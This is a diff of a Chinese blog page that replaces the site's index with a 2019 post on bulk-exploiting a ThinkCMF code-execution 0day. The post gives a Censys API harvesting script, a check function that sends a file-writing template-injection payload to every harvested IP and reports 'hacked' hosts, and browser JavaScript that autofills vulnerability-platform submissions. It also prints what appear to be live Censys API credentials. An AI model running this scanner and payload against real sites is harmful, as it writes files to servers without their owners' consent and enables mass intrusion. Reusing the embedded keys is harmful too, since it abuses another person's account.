@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>阿杰的小站</title>
+    <title>Thinkcmf批量搜漏洞并提交到漏洞平台 · 阿杰的小站</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >阿杰的小站</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Thinkcmf批量搜漏洞并提交到漏洞平台</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>阿杰的小站</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg3.jpeg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            阿杰的小站
-            <!-- 文章页  -->
+            Thinkcmf批量搜漏洞并提交到漏洞平台
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,49 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                冲冲冲.../成信大
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/24</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,267 +399,85 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/05/13/bugku代码审计wp/" >
-            
-                <span>bugku代码审计wp</span>
-        </a>
-        <div class="abstract-content">
-            0x01. extract变量覆盖1234567891011121314$flag=&apos;xxx&apos;;extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo&apos;flag&#123;xxx&#125;&apos;;&#125;else&#123;echo&apos;Oh.no&apos;;&#125;&#125;
-\$shiyan和$flag变量由extract变量覆盖进行控制$content变量由fil...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/04/21/PHP反序列化绕过__wakeup方法/" >
-            
-                <span>PHP反序列化绕过__wakeup方法</span>
-        </a>
-        <div class="abstract-content">
-            0x01.前言做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10
-0x02. public private protected的序列化12345678910111213class Kage&#123;	public $name=&apos;kxj&apos;;	private $name2=&apos;kxj&apos;;	protected $name3=&apos;kxj&apos;;	public function getName()&#123;		var_dump(...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/03/31/文件包含漏洞/" >
-            
-                <span>文件包含漏洞小结</span>
-        </a>
-        <div class="abstract-content">
-            原理如果客户可以将恶意参数动态地添加到包含函数中，会导致恶意代码执行，敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见函数有：include()、require()区别：
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近Thinkcmf爆出了一个0day，可以利用该漏洞在网站根目录下写文件，并可以访问，从而触发代码执行漏洞。对于刚爆出的漏洞，我们如何进行全网扫描，并快速提交到漏洞平台，这是本文所要介绍的。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先我们要先知道thinkcmf的指纹，然后通过指纹利用搜索引擎进行批量获取目标，将目标入库整理，再对目标测试是否有漏洞，有漏洞的目标再获取目标具体信息，最后提交到漏洞平台，具体可以分成以下几个阶段。</p>
+<ul>
+<li>获取指纹</li>
+<li>搜索目标</li>
+<li>目标入库</li>
+<li>检测目标</li>
+<li>获取目标信息</li>
+<li>提交漏洞</li>
+</ul>
+<h2 id="获取指纹"><a href="#获取指纹" class="headerlink" title="获取指纹"></a>获取指纹</h2><p>可以先利用fofa、钟馗之眼、shodan等来获取少量目标网站，通过对目标网站抓包，查看返回包具体特征，来获取网站的web指纹。常见的web指纹有特殊的目录信息、hearder头信息、前端模板信息等。<br>通过以上方法，获得thinkcmf的指纹：<code>x_powered_by:ThinkCMF</code></p>
+<h2 id="搜索目标"><a href="#搜索目标" class="headerlink" title="搜索目标"></a>搜索目标</h2><p>有了指纹，那么我们如何快速搜索目标呢，可以利用api调用各个搜索引擎写脚本来批量获取。<br>选择什么搜索引擎？本人推荐Google和Censys，有钱的可以使用fofa和Zoomeye。<br>Censys搜索引擎免费用户就可以查询1000条数据，是相当实惠的，而其他网络空间搜索引擎需要付费。<br>Censys语法：</p>
+<ul>
+<li>80.http.get.status_code: 200         //80端口get请求状态码为200</li>
+<li>8080.http.get.body: xxx            //8080端口get请求body中xxx</li>
+<li>8080.http.get.metadata.product: tomcat  //制定中间件</li>
+<li>metadata.os:windows            //指定系统版本</li>
+<li>location.country:China      //指定地区</li>
+</ul>
+<p>帮助文档：<a href="https://censys.io/api/v1/docs/search" target="_blank" rel="noopener">https://censys.io/api/v1/docs/search</a><br>thinkcmf搜索语法：<code>80.http.get.headers.x_powered_by:ThinkCMF and location.country:China</code></p>
+<p>Censys api调用简介：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  “query”:“80.http.get.headers.server: Apache”,	#必填搜索语法</span><br><span class="line">  “page”:1,					#返回第几页数据</span><br><span class="line">  “fields”:[“ip”, “location.country”],	#限定返回的字段</span><br><span class="line">  “flatten”:true				#返回格式无内嵌</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>利用api和多线程写脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import pymysql</span><br><span class="line"># 输入：ip，功能：将list中的数据插入到数据库</span><br><span class="line">def insertDB(ip):</span><br><span class="line">	conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;thinkcmf&quot;)</span><br><span class="line">	cursor = conn.cursor()</span><br><span class="line">	for name in ip:</span><br><span class="line">		try:</span><br><span class="line">			cursor.execute(&quot;insert into website(ip) values (&apos;%s&apos;)&quot; % name[&apos;ip&apos;])</span><br><span class="line">		except:</span><br><span class="line">			print(&quot;ip重复：%s&quot; % name)</span><br><span class="line">	conn.commit()</span><br><span class="line">	cursor.close()</span><br><span class="line">	conn.close()</span><br><span class="line"></span><br><span class="line"># api地址</span><br><span class="line">api_url = &quot;https://www.censys.io/api/v1&quot;</span><br><span class="line"># 请求内容</span><br><span class="line">query = &apos;80.http.get.headers.x_powered_by:ThinkCMF&apos;</span><br><span class="line"># 个人私钥匙</span><br><span class="line">uid = &quot;ccf3d2b3-0f83-4a51-a4ae-cd5d17f2de76&quot;</span><br><span class="line"># 个人私钥密码</span><br><span class="line">secret = &quot;ci6LVImltFzBYgdhUnWlvN9VSxqTk7Bh&quot;</span><br><span class="line"></span><br><span class="line"># 免费用户只能请求1000条，循环前10页，每页100条</span><br><span class="line">for i in range(1,11):</span><br><span class="line">	data = &#123;&quot;query&quot;:query,&quot;page&quot;:i,&quot;fields&quot;:[&quot;ip&quot;]&#125;</span><br><span class="line">	res = requests.post(api_url + &quot;/search/ipv4&quot;, data=json.dumps(data), auth=(uid,secret))</span><br><span class="line">	results = res.json()</span><br><span class="line">	# 将ip数据入库</span><br><span class="line">	insertDB(results[&apos;results&apos;])</span><br><span class="line">	print(&quot;%d ok&quot; % i)</span><br></pre></td></tr></table></figure></p>
+<h2 id="检测目标"><a href="#检测目标" class="headerlink" title="检测目标"></a>检测目标</h2><p>通过网上报出的payload，通过分析是可以进行自动化调用的，payload：<br><code>http://test.com/?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,base64_decode(&#39;PD9waHAgcGhwaW5mbygpOyA/Pg==&#39;))&lt;/php&gt;</code><br>该payload意思是在网站根目录下写入一个test.php文件，内容为phpinfo信息。因而我们可以访问这个test.php，查看phpinfo信息来判断漏洞是否存在，如果存在将数据库的对应ip位置设置为1。</p>
+<p>检测函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 两次请求检测目标是否存在漏洞</span><br><span class="line">def check(ip):</span><br><span class="line">	payload = &quot;?a=fetch&amp;templateFile=public/index&amp;prefix =&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test1.php&apos;,base64_decode(&apos;PD9waHAgcGhwaW5mbygpOyA/Pg==&apos;))&lt;/php&gt;&quot;</span><br><span class="line">	test_url = &quot;http://%s&quot; % ip + payload</span><br><span class="line">	requests.get(test_url)</span><br><span class="line">	check_url = &quot;http://%s&quot; % ip + &quot;/test1.php&quot;</span><br><span class="line">	result = requests.get(check_url)</span><br><span class="line">	return &quot;php&quot; in result.text</span><br><span class="line">	</span><br><span class="line"># 漏洞存在将ip位设置为1</span><br><span class="line">def myfunction(ip):</span><br><span class="line">	if check(ip):</span><br><span class="line">		conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;thinkcmf&quot;)</span><br><span class="line">		cursor = conn.cursor()</span><br><span class="line">		cursor.execute(&quot;UPDATE com set vuln=1 where ip=&apos;%s&apos;&quot; % ip)</span><br><span class="line">		conn.commit()</span><br><span class="line">		cursor.close()</span><br><span class="line">		conn.close()</span><br><span class="line">		print(&quot;%s hacked&quot; % ip)</span><br><span class="line">	else:</span><br><span class="line">		print(&quot;%s nono&quot; % ip)</span><br></pre></td></tr></table></figure></p>
+<h2 id="获取目标信息"><a href="#获取目标信息" class="headerlink" title="获取目标信息"></a>获取目标信息</h2><p>通过上一轮，我们获得了存在漏洞的ip地址，那么这些网站是否符合漏洞平台的要求，就需要通过获取目标信息来评估。<br>一般我们获取：</p>
+<ul>
+<li>域名信息</li>
+<li>公司名称</li>
+<li>权重比</li>
+<li>位置信息</li>
+</ul>
+<p>我们可以通过爱站网或者站长之家进行获取，当然信息量多的话，我们可能就需要氪金利用api调用，如果数据少可以利用爬虫技术获取，最后将获取的信息入库即可。<br>爱站网：<a href="https://www.aizhan.com/" target="_blank" rel="noopener">https://www.aizhan.com/</a><br>站长之家：<a href="http://www.chinaz.com/" target="_blank" rel="noopener">http://www.chinaz.com/</a><br>通过以上方法获取到域名、公司等信息，可能会存在不同的ip是相同的域名，那么我们就需要通过sql语句进行去重操作。去重sql语句，可以通过下例自己修改：<br><code>DELETE FROM subdomain WHERE name IN(SELECT name FROM (SELECT name FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) a) AND id NOT IN(SELECT * FROM (SELECT MIN(id) FROM subdomain GROUP BY name HAVING COUNT(name) &gt; 1) b)</code></p>
+<h2 id="快速提交"><a href="#快速提交" class="headerlink" title="快速提交"></a>快速提交</h2><p>一般漏洞平台需要我们提供zip文件和各种描述，我们对于同一个漏洞不同网站的提交，描述基本上都一样，不同的只是公司名和域名，那么我们可以先建立md文档，利用py脚本对其填充即可。<br>而对于网站内信息的填写，我本人是通过js代码进行半自动化提交，通过python生成js代码，在利用js代码在网页中执行即可。示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector(&quot;#inputCompy&quot;).value = &quot;腾讯&quot;</span><br><span class="line">document.querySelector(&quot;#tabs &gt; form &gt; div.tabs-con.tabs-con-loo &gt; ul &gt; li:nth-child(3) &gt; input&quot;).value = &quot;tecent.com&quot;</span><br><span class="line">document.querySelector(&quot;#selCate&quot;).value=&quot;1&quot;</span><br><span class="line">document.querySelector(&quot;#title&quot;).value=&quot;腾讯存在代码执行漏洞&quot;</span><br><span class="line">document.querySelector(&quot;#cateURL &gt; input&quot;).value=&quot;http://tecent.com?a=fetch&amp;templateFile=public/index&amp;prefix=&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,base64_decode(&apos;PD9waHAgcGhwaW5mbygpOyA/Pg==&apos;))&lt;/php&gt;&quot;</span><br><span class="line">document.querySelector(&quot;#lootypesel2&quot;).value=&quot;4&quot;</span><br><span class="line">document.querySelector(&quot;#description&quot;).value=&quot;该系统cms使用的是thinkcmf，存在代码执行漏洞&quot;</span><br><span class="line">document.querySelector(&quot;#repair_suggest&quot;).value=&quot;尽快到官方网站跟新补丁&quot;</span><br><span class="line">document.querySelector(&quot;#industry1&quot;).value=&quot;6&quot;</span><br><span class="line">document.querySelector(&quot;#selec1&quot;).value=&quot;深圳市&quot;</span><br><span class="line">document.querySelector(&quot;#tabs &gt; form &gt; div.tabs-con.tabs-con-loo &gt; ul &gt; li.addInput.addInput2 &gt; p &gt; input[type=checkbox]&quot;).value=&quot;1&quot;</span><br><span class="line">document.querySelector(&quot;#agreep &gt; input[type=checkbox]&quot;).value=&quot;1&quot;</span><br></pre></td></tr></table></figure></p>
+<p>听小伙伴说大佬能够全自动化绕验证码提交，很是羡慕，不知道是怎么实现的。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上思路实现还是挺简单的，如果有小伙伴想试试刷补天这些类似平台，可以利用上述方法。</p>
 
-include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
-require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行
-
-require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模板文件include_once()、require_once()与(include\require)的功能相同,只...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/31</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-</div>
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/03/同一台电脑连接多个github仓库/" >
-            
-                <span>同一台电脑连接多个github仓库</span>
-        </a>
-        <div class="abstract-content">
-            0x01.生成密钥1ssh-keygen -t rsa -C &quot;yourname@email.com&quot;
-分别生成两次公钥，可以得到两组公钥和私钥
-0x02. 在github上添加公钥不解释
-0x03. 添加config配置文件在.ssh文件夹下添加config文件1234567891011#第一个账号 Bu1uokageHost github.comHostName github.comUser gitIdentityFile ~/.ssh/id_rsa#第二个账号 K4geHost K4geHostName github.comUser gitIdentityFil...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/">http://yoursite.com/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/">十月 24日 2019, 11:25:06 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/">October 24th 2019, 11:25:06 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/03/hgame草稿/" >
-            
-                <span>hgame-web-week1</span>
-        </a>
-        <div class="abstract-content">
-            1. 谁吃了我的flag获取vim备份文件vim自动退出会临时备份隐藏文件 .xxx.swp用linux打vim -r .xxx.swp 可以恢复备份文件hgame{3eek_diScl0Sure_fRom+wEbsit@}
-2. 换头大作战输入框输入，要求使用postpost输入要求使用waterfox，更改要求bilibili登录最后得到flaghgame{hTTp_HeaDeR_iS_Ez}
-3. very easy web1234567891011121314&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(s...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/page/4/">&#60; PREV</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
-    </nav>
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/Kage.jpg >
-    <div class="profile-name">部落阿杰</div>
-    
-    <div class="profile-signature">
-        苟有恒，何必三更眠五更起。
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+        </li>
+        <li class="previous">
             
-                <a href="mailto:543251348@qq.com" class="iconfont-archer email" title=email ></a>
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/24/python编程总结/" title= "python编程总结">
+                    <div class="prevTitle">python编程总结</div>
+                </a>
             
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
-            
-                <a href="//github.com/K4ge" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
-            
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href= //www.baidu.com target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href= //www.google.com target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -691,6 +557,24 @@ require一般是用于文件头包含类文件、数据库等等文件，include
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取指纹"><span class="toc-number">3.</span> <span class="toc-text">获取指纹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搜索目标"><span class="toc-number">4.</span> <span class="toc-text">搜索目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测目标"><span class="toc-number">5.</span> <span class="toc-text">检测目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取目标信息"><span class="toc-number">6.</span> <span class="toc-text">获取目标信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#快速提交"><span class="toc-number">7.</span> <span class="toc-text">快速提交</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">8.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1700,6 +1584,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
